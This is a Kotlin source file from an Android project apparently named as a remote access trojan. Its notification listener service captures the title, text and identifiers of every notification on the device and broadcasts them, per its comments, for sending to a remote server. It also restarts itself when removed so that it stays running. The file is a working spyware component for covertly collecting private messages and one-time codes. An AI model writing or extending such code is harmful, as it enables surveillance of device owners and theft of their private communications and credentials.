package com.nqmgaming.androidrat.service

import android.app.Notification
import android.content.Intent
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.nqmgaming.androidrat.receivers.NotificationReceiver

class NotificationListener : NotificationListenerService() {
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        // Send notification to server

        sbn?.let {
            val packageName = it.packageName
            val content = extractNotificationContent(it)
            val title = it.notification.extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString()
            val notificationId = it.id
            val notificationTag = it.tag
            val notificationKey = it.key
            val notificationGroupKey = it.groupKey
            Log.d("NotificationListener", "Notification received: $packageName - $title - $content")
            // Send notification data to WebSocketService using a broadcast intent
            val intent = Intent(applicationContext, NotificationReceiver::class.java).apply {
                action = "notification_data"
                putExtra("package_name", packageName)
                putExtra("notification_content", content)
                putExtra("notification_title", title)
                putExtra("notification_id", notificationId)
                putExtra("notification_tag", notificationTag)
                putExtra("notification_key", notificationKey)
                putExtra("notification_group_key", notificationGroupKey)

            }
            applicationContext.sendBroadcast(intent)
        }

    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)
        startService(restartServiceIntent)
        super.onTaskRemoved(rootIntent)
    }

    private fun extractNotificationContent(sbn: StatusBarNotification): String? {
        val notification = sbn.notification

        notification.extras?.getCharSequence(Notification.EXTRA_TEXT)?.let {
            return it.toString()
        }

        return null
    }
}